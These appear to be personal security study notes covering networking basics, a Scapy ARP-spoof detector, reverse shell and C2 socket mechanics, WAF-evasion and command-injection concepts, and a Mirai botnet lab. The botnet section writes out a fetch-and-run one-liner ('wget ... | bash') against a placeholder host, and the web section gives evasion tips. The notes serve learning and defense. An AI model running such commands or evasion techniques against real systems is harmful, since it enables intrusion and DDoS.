# Security Concepts — Study Notes

Networking and offensive/defensive concepts collected while learning. Condensed
into a quick reference.

## Networking
- **NAT** — translates private IPs to one public IP. **SNAT** rewrites source
  (home routers), **DNAT** forwards inbound (port forwarding), **PAT/masquerading**
  also rewrites ports.
- **IPv6** — 128-bit, eight hex groups. Too large for brute scanners like Masscan
  to sweep fully.
- **ICMP** — control/diagnostic protocol (ping, unreachable, redirects), not data
  transport.
- **Sockets** — the programming interface for network I/O. A client socket
  `connect()`s; a server socket `bind()` → `listen()` → `accept()`. Both sides must
  match family (AF_INET / AF_INET6) and type (SOCK_STREAM = TCP / SOCK_DGRAM = UDP).

## Sniffing & why it matters for a SOC
Packet capture is used to analyse attacks (spot a reverse shell), find malicious
activity (data exfiltration, C2 beacons), investigate incidents, catch
misconfigurations (plaintext creds over HTTP), and read non-TLS protocols
(HTTP/FTP/POP3/Telnet).

## ARP spoofing — detect it with Scapy
A simple detector: track each MAC→IP mapping; if a known MAC suddenly claims a new
IP, flag a possible spoof.
```python
from scapy.all import sniff
ip_mac = {}
def check(pkt):
    mac, ip = pkt['Ether'].src, pkt['ARP'].psrc
    if mac in ip_mac and ip_mac[mac] != ip:
        print(f"Possible ARP spoof: {mac} was {ip_mac[mac]}, now {ip}")
    else:
        ip_mac.setdefault(mac, ip)
sniff(filter="arp", store=0, prn=check)   # filter: arp | tcp | "udp and port 53" | "host 1.2.3.4"
```

## Reverse shell / C2 — the socket mechanics
- **Reverse shell**: victim connects *out* to the attacker's listener (bypasses
  inbound firewall rules), then pipes a shell over the socket.
- **C2 server** (`shellServer`): binds a port, accepts the bot, sends commands,
  reads results. Keep IP family/protocol identical on both ends; `SO_REUSEADDR`
  lets you rebind the port immediately on restart.

## Web-attack concepts
- **Command injection** — running OS commands through a web app's unsanitised input
  (obfuscate to dodge filters).
- **User-Agent** — browser "passport"; change it (`sqlmap --random-agent`) to hide
  tooling or bypass naive filters.
- **WAF** — inspects requests for SQLi/XSS/command-injection patterns before they
  reach the app.
- **Tamper scripts** — transform payloads (base64, URL-encode, comments) to evade a
  WAF.
- **Hashing** — one-way fingerprint of data; you can't reverse it, only crack it by
  guessing (dictionary / brute force) and comparing.

## Botnet / DDoS (concept only — lab study of Mirai)
Many hosts fetching and running the same command (`wget -O - http://x/cmd.sh | bash`)
can flood a target. Studied to understand the detection surface, not to deploy.

## Moniker Link (CVE-2024-21413)
Outlook link-handling vulnerability — part of OWASP Top 10 2025 study track.
